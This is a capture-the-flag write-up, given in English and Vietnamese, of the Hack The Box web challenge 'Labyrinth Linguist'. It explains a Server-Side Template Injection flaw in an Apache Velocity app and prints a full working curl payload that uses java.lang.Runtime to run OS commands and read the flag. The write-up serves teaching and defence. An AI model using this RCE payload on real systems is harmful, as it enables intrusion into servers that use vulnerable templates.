### **English Version**

# HTB - Labyrinth Linguist

  * **Category:** Web
  * **Tags:** SSTI, Server-Side Template Injection, Java, Apache Velocity, RCE

-----

## **1. Challenge Summary**

The challenge provided a web application named "Labyrinth Linguist," designed to translate English text into a fictional language, "voxalith." We were given the Java source code, which revealed a Spring Boot application using the Apache Velocity template engine. The goal was to find a vulnerability that would allow us to read a flag file on the server.

-----

## **2. Initial Analysis & Reconnaissance**

The first and most critical step was analyzing the provided `Main.java` source code. The core logic resided in the `index` and `readFileToString` methods.

I observed that the user-supplied `textString` parameter was directly inserted into the HTML template content using `line.replace("TEXT", replacement)`. This modified template string was then passed to the Velocity engine for parsing and rendering. This is a classic and highly critical pattern for Server-Side Template Injection (SSTI).

-----

## **3. The Vulnerability**

The application was vulnerable to **Server-Side Template Injection (SSTI)**.

The fundamental flaw was that the application modified the template file as a raw string *before* the template engine processed it. A secure implementation would pass user data into the template's context as a variable (e.g., `context.put("userInput", textString)`), which Velocity would safely render as a string.

Instead, by injecting the user's input directly into the template body, we could include Velocity's special syntax (directives like `#set` and references like `$var`) which the engine would then execute as code.

-----

## **4. Exploitation Steps**

The exploitation followed a logical progression from confirming the vulnerability to achieving Remote Code Execution (RCE).

1.  **Confirming SSTI:** My first step was to submit a basic Velocity expression to confirm that it would be evaluated. The payload `text=#set($a=7*7)$a` was sent, and the server correctly responded with `49`, proving the injection point.

2.  **Escalating to RCE:** With SSTI confirmed, the next step was to achieve RCE. Since Velocity runs in a Java environment, we can access underlying Java classes. I crafted a payload to get an instance of `java.lang.Runtime`, execute an OS command (`ls -la /app`), and then use a `java.util.Scanner` object to read the command's output stream and display it on the page.

3.  **Locating and Reading the Flag:** The `ls` command executed successfully, showing the application's directory structure and confirming we had `root` privileges. To find the flag, I used the `find` command (`find / -name *flag*`). This would have revealed the flag's location. Based on your final payload, it was located at `/app/flag.txt`. The final step was to change the command in our RCE payload to `cat /app/flag.txt` to read its contents.

-----

## **5. Final Exploit / Payload**

The final payload, URL-encoded and sent via `curl`, reads the flag from the server:

```bash
curl -X POST http://<TARGET_IP>:<TARGET_PORT>/ --data-urlencode 'text=#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($zt=$rt.getRuntime())#set($cmd="cat /app/flag.txt")#set($process=$zt.exec($cmd))#set($inputStream=$process.getInputStream())#set($scanner=$x.class.forName("java.util.Scanner").getConstructor($x.class.forName("java.io.InputStream")).newInstance($inputStream).useDelimiter("\\A"))#set($output=$scanner.next())Voxalith Translation: $output'
```

-----

## **6. Key Takeaways & Lessons Learned**

  * **Never trust user input in template strings:** The core lesson is the immense danger of concatenating or replacing parts of a template file with raw user input before rendering. Data should always be passed securely through the context.
  * **Velocity's Power is a Double-Edged Sword:** Velocity's ability to interact with underlying Java objects makes it extremely powerful, but also a prime target for RCE when an SSTI vulnerability is present.

-----

### **Phiên Bản Tiếng Việt**

# HTB - Labyrinth Linguist

  * **Chuyên mục:** Web
  * **Tags:** SSTI, Server-Side Template Injection, Java, Apache Velocity, RCE

-----

## **1. Tóm Tắt Thử Thách**

Thử thách cung cấp một ứng dụng web có tên "Labyrinth Linguist", với chức năng dịch văn bản tiếng Anh sang một ngôn ngữ hư cấu là "voxalith". Chúng ta được cung cấp mã nguồn Java, cho thấy đây là một ứng dụng Spring Boot sử dụng template engine Apache Velocity. Mục tiêu là tìm ra lỗ hổng để đọc được file flag trên máy chủ.

-----

## **2. Phân Tích & Trinh Sát Ban Đầu**

Bước đầu tiên và quan trọng nhất là phân tích file mã nguồn `Main.java`. Logic chính nằm trong hai phương thức `index` và `readFileToString`.

Ta đã quan sát thấy tham số `textString` do người dùng cung cấp được chèn trực tiếp vào nội dung template HTML thông qua lệnh `line.replace("TEXT", replacement)`. Chuỗi template đã bị sửa đổi này sau đó được chuyển đến engine Velocity để phân tích và render. Đây là một dấu hiệu kinh điển và rất nguy hiểm của lỗ hổng Server-Side Template Injection (SSTI).

-----

## **3. Lỗ Hổng**

Ứng dụng có lỗ hổng **Server-Side Template Injection (SSTI)**.

Sai lầm cơ bản là ứng dụng đã sửa đổi file template dưới dạng một chuỗi thô *trước khi* template engine xử lý nó. Một cách triển khai an toàn sẽ truyền dữ liệu người dùng vào context của template như một biến (ví dụ: `context.put("userInput", textString)`), và Velocity sẽ hiển thị nó một cách an toàn dưới dạng chuỗi.

Thay vào đó, bằng cách chèn thẳng dữ liệu của người dùng vào thân template, chúng ta có thể đưa vào các cú pháp đặc biệt của Velocity (chỉ thị như `#set` và tham chiếu như `$var`), và engine sẽ thực thi chúng như mã lệnh.

-----

## **4. Các Bước Khai Thác**

Quá trình khai thác diễn ra theo một trình tự logic, từ việc xác nhận lỗ hổng đến việc đạt được thực thi mã lệnh từ xa (RCE).

1.  **Xác nhận SSTI:** Bước đầu tiên là gửi một biểu thức toán học cơ bản của Velocity để xác nhận rằng nó sẽ được thực thi. Payload `text=#set($a=7*7)$a` được gửi đi, và máy chủ trả về kết quả chính xác là `49`, chứng minh được điểm injection.

2.  **Leo thang lên RCE:** Khi đã xác nhận được SSTI, bước tiếp theo là đạt được RCE. Vì Velocity chạy trong môi trường Java, chúng ta có thể truy cập các lớp Java cơ bản. Ta tạo một payload để lấy một instance của `java.lang.Runtime`, thực thi một lệnh của hệ điều hành (`ls -la /app`), sau đó sử dụng đối tượng `java.util.Scanner` để đọc output stream của lệnh và hiển thị nó trên trang.

3.  **Định vị và Đọc Flag:** Lệnh `ls` đã thực thi thành công, cho thấy cấu trúc thư mục của ứng dụng và xác nhận chúng ta đang chạy với quyền `root`. Để tìm flag, sử dụng lệnh `find` (`find / -name *flag*`). Lệnh này sẽ cho thấy vị trí của file flag. Dựa trên payload cuối cùng, nó nằm ở `/app/flag.txt`. Bước cuối cùng là thay đổi lệnh trong payload RCE thành `cat /app/flag.txt` để đọc nội dung của nó.

-----

## **5. Payload / Khai Thác Cuối Cùng**

Payload cuối cùng, đã được URL-encode và gửi qua `curl`, dùng để đọc flag từ máy chủ:

```bash
curl -X POST http://<TARGET_IP>:<TARGET_PORT>/ --data-urlencode 'text=#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($zt=$rt.getRuntime())#set($cmd="cat /app/flag.txt")#set($process=$zt.exec($cmd))#set($inputStream=$process.getInputStream())#set($scanner=$x.class.forName("java.util.Scanner").getConstructor($x.class.forName("java.io.InputStream")).newInstance($inputStream).useDelimiter("\\A"))#set($output=$scanner.next())Voxalith Translation: $output'
```

-----

## **6. Bài Học Kinh Nghiệm**

  * **Không bao giờ tin tưởng input người dùng trong chuỗi template:** Bài học cốt lõi là sự nguy hiểm cực độ của việc nối hoặc thay thế các phần của file template bằng dữ liệu thô từ người dùng trước khi render. Dữ liệu phải luôn được truyền một cách an toàn thông qua context.
  * **Sức mạnh của Velocity là con dao hai lưỡi:** Khả năng tương tác với các đối tượng Java cơ bản của Velocity làm cho nó cực kỳ mạnh mẽ, nhưng cũng biến nó thành một mục tiêu hàng đầu cho RCE khi có lỗ hổng SSTI.
